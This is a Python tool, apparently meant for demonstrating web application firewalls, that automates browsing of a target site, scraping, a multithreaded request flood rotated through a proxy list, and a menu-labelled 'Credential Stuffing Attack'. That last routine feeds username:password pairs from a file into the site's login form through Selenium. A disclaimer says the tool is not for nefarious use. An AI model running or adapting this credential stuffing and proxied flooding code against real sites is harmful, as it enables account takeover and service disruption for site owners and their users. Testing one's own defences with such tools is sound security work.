import time, platform, sys, getopt, random, os, csv
import concurrent.futures
import validators, requests
import pandas as pd
from selenium import webdriver 
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException

__author__ = "Luke Babarinde"
__credits__ = "Manny Liwanag"
__license__ = "MIT"
__version__ = "1.0.1"
__email__ = "neofinder@gmail.com"


def main():
    url = ''
    try:
        opts, arg = getopt.getopt(sys.argv[1:],"u:")
        for opt, arg in opts:
            if opt == '-u':
                url = str(arg)
                return url  #returns the variables to be used as inputs in other functions
    except getopt.GetoptError as e:
        print (e, 'python wafautosurf.py -u <Host URL>')
        sys.exit(2)

def bot_broswing(url):
    #Start automated browsing after validating the url
    if validators.url(url):
        auto_surf()
    else:
        print ("Check the input parameters for url. Need to provide full url: http(s)://<fullURL>")
        print ('python wafautosurf.py -u <http(s)://HostURL>')

def select_browser():
    pltOS = platform.system() #This helps identify the base OS - Darwin, Windows and Linux

    try:
        '''Drivers downloaded from https://chromedriver.chromium.org/
        and placed inside ./drivers folder'''

        # #Adding diversification of broswers based on OS to choose randomly between Chrome and Firefox
        if pltOS == 'Darwin':
            browser_name = random.choice(os.listdir("./drivers/mac"))
            print (f"Using {browser_name} Driver")
            driver_path = os.path.join("./drivers/mac/", browser_name)
            if browser_name == "geckodriver":
                browser = webdriver.Firefox(executable_path=f"{driver_path}")
                return browser
            else:
                browser = webdriver.Chrome(executable_path=f"{driver_path}")
                return browser

        elif pltOS == 'Linux':
            #This configuration allows linux server to natively run this program
            current_path = os.getcwd()
            driver_file = "/drivers/linux/chromedriver"
            file_path = current_path+driver_file
            option = webdriver.ChromeOptions()
            option.add_argument('--no-sandbox')
            option.add_argument('--disable-dev-shm-usage')
            option.add_argument('--headless')
            browser = webdriver.Chrome(executable_path=f"{file_path}",options=option)
            return browser

        elif pltOS == 'Windows':
            browser_name = random.choice(os.listdir(".\drivers\windows"))
            print (f"Using {browser_name} Driver")
            driver_path = os.path.join(".\drivers\Windows", browser_name)
            if browser_name == "geckodriver.exe":
                browser = webdriver.Firefox(executable_path=f"{driver_path}")
                return browser
            else:
                browser = webdriver.Chrome(executable_path=f"{driver_path}")
                return browser
    except:
        print ("Place driver for browser in drivers directory. This can be downloaded from https://chromedriver.chromium.org/")
        return


def login(username, password, login_url, username_pram, password_pram):
    try:
        auth_url = url+login_url
        driver = select_browser() #Call function to set browser driver
        driver.get (auth_url) #URL is defined in universal variable from main()
        #use credential dictionary file
        print (f'Initial URL {driver.current_url}')
        driver.find_element_by_name(f'{username_pram}').send_keys(username)
        element = driver.find_element_by_name(f'{password_pram}')
        element.send_keys(password)
        element.send_keys(Keys.RETURN)
        time.sleep(4)
        print (f"Tried Username: {username} and Password: {password}\nRedirected to {driver.current_url}\n")
        driver.quit()

    except Exception as v:
        time.sleep(1)
        print (f"Tried {username} and {password}\n")

def scrape_data(url, ticker):
    driver = select_browser()
    driver.get(url)
    time.sleep(1)

# Find the first table on the page and start scraping - 
# not too sophisticated but should be good enough for illustration
    '''Start the browser, input a search, and look for tables
    In this example, we are using predefined list of tickers as the input criteria'''
    try:
        print (ticker)
        element = driver.find_element_by_name('search')
        element.send_keys(ticker)
        element.send_keys(Keys.RETURN)
        time.sleep(2)
        df = pd.read_html(driver.page_source)[0]
        df = (df.head(5))
        print (df)

        #The following saves the data to file - not necessary for illustration but nice to have
        file_path = "./data/scraped.csv"
        df = pd.DataFrame(df)
        df.to_csv(file_path, index=False, header=False)

    except NoSuchElementException as e:
        takescreenshot(driver)
        print (e, "**ALERT** 'Search' element could not be found. Check that the site is active")
        return breakpoint


def takescreenshot(driver):
    #Screenshots saved under ./data folder
    randnum = random.randint(0,99)
    screenshot_path = f'./data/screenshot{randnum}.png'
    driver.save_screenshot(screenshot_path)
    return


def scrape():
    search_list = ["GOOG", "AAPL", "TMUS", "T", "NKE"] #This list contains words to search
    for ticker in search_list:
        scrape_data(url, ticker)


def auto_surf():
    n = 1
    t = int(input("Enter number of requests to perform > "))
    while n <= t:
        scrape()
        n += 1
        print (f'Round {n-1} of {t} automated browsing of {url}')


def cred_spray():
    login_url = str(input("Enter the login url e.g. /login.jsp  > "))
    username_pram = str(input("Enter the username parameter name > "))
    password_pram = str(input("Enter the password parameter name > "))
    #Grap credentials from specified file and use for padding
    with open('./data/accounts.txt', 'r') as f:
        for line in f:
            combo = line.strip('\r\n').split(':')
            username = combo[0]
            password = combo[1]
            '''use the credentials within the login function to 
            brute force with the credentials'''
            login(username, password, login_url, username_pram, password_pram)
        return

def load_test(i):
    proxy = pick_proxy()
    p = "http://"+proxy
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'}
    session = requests.Session()
    session.proxies = p
    request = session.get(url, headers=headers, verify = True)
    ppid = os.getppid()
    pid = os.getpid()
    print (f'No of requests: {i}')
    sys.stdout.flush()

def load_threading():
    r = int(input("Enter number of requests to send > "))
    max_workers = int(input("Enter number of requests per second. Example -> 5 = 50rps, 10 = 100rps > "))
#Achieve high speed of requests with 10 workers. Worker can be increased to acheve greater speed
    executor = concurrent.futures.ThreadPoolExecutor(max_workers=max_workers)
    start = time.time()
    for i in range(r,0,-1):
        f = executor.submit(load_test, i)
    executor.shutdown()
    end = time.time()
    print (f'\nTime to execute is {end - start:.2f}s\n')

def pick_proxy():
    proxies = csv.reader(open('./data/proxies.csv', 'r'))
    get_proxy = sum((proxy for proxy in proxies), [])
    proxy = random.choice(get_proxy)
    return (proxy)

def random_clicks():
    driver = select_browser()
    driver.get(url)
    time.sleep(2)
    n = 0
    while n < 2: #This allows the bot to click random links 3 steps deep into the site
        try:
            links = driver.find_elements_by_partial_link_text('')
            l = links[random.randint(0, len(links)-1)]
            l.click()
            print(f'Clicked on link: {driver.current_url}')
            time.sleep(2)
            n += 1
        except:
            driver.quit()
            return
    driver.quit()

def humanbot(url):
    n = 0
    t = int(input("Enter number of iterations to surf the site > "))
    while n < t:
        random_clicks()
        n += 1


def menu():
    menu=True
    while menu:
        print("""
        ** Caution: Still under development.
        This tool is not intended to be used for nefarious activities.
        The solve purpose of its inception is to measure show the value of in-depth web application security

        1. Simulate Human-like automated surfing
        2. Basic Automated Load Test using Requests - simple load test using 'python requests'
        3. Scrape Content - scrapes tables
        4. Credential Stuffing Attack - #first configure dictionary in data/accounts.txt
        5. Exit/Quit
        """)

        menu=input("What would you like to do? ")
        if menu=="1":
            print("\n Simulate Human-like automated surfing")
            humanbot(url)
        elif menu=="2":
            print("\n Basic Automated Load Test using Requests")
            load_threading()
        elif menu=="3":
            print("\n Launching Content Scraping")
            print (f'Content is now being scrapped from {url}')
            bot_broswing(url)
        elif menu=="4":
            print("\n Credential Stuffing Attack")
            cred_spray()
        elif menu=="5" or "q":
            break
        elif menu == None:
            print("\n Not Valid Choice Try again")

if __name__ == "__main__":
    url = main()
    menu()